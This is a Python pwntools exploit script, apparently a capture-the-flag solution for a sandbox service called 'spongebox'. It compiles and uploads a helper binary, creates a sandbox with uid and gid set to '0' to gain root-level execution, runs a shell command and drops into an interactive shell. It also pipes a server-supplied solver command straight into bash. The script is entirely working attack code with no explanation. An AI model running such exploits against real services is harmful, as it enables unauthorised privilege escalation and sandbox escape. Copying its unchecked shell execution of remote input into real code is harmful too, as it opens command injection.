#!/usr/bin/env python
from pwn import *
from time import sleep
from os import getuid, popen, system

context.binary = e = ELF("sandbox")
gs = """
list main
b 312
b 291
"""

# if os.getuid() == 0:
#     context.terminal = ['wt.exe', '-w', '0', 'split-pane',
#                         '-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04', 'sudo', 'bash', '-c']


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
            global sleep

            def sleep(n):
                pause()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
        p.recvuntil(b'You can run the solver with:\n')
        command = p.recvline().decode()
        sol = popen(f"bash -c '{command}'").read()
        p.sendlineafter(b'Solution? ', sol)

    elif args.DOCKER:
        p = process(
            "docker run --name spongebox --privileged -i spongebox".split())
        sleep(1)

    return p


popen("gcc x.c -static -o x && strip -s x")
p = start()


def create(uid_size, uid, gid_size, gid, elf_size, elf):
    p.send(p8(1))
    sleep(0.2)
    p.send(p64(uid_size))
    p.send(uid)
    sleep(0.2)
    p.send(p64(gid_size))
    p.send(gid)
    sleep(0.2)
    p.send(p64(elf_size))
    p.send(elf)


def connect_box(sandboxid):
    p.send(p8(2))
    sleep(0.2)
    p.send(p32(sandboxid))


def communicate(sandboxid, msg):
    p.send(p8(3))
    sleep(0.2)
    p.send(p32(sandboxid))
    sleep(0.2)
    p.sendline(msg)


uid = b'0'
gid = uid
elf_ = open("x", "rb").read()

create(len(uid), uid, len(gid), gid, len(elf_), elf_)
p.recvuntil(b"Sucessfully created sandbox!\n")
context.log_level = 'debug'
sleep(1)
connect_box(0)
sleep(1)
communicate(0, b' ls')

p.interactive()

system('docker stop spongebox')
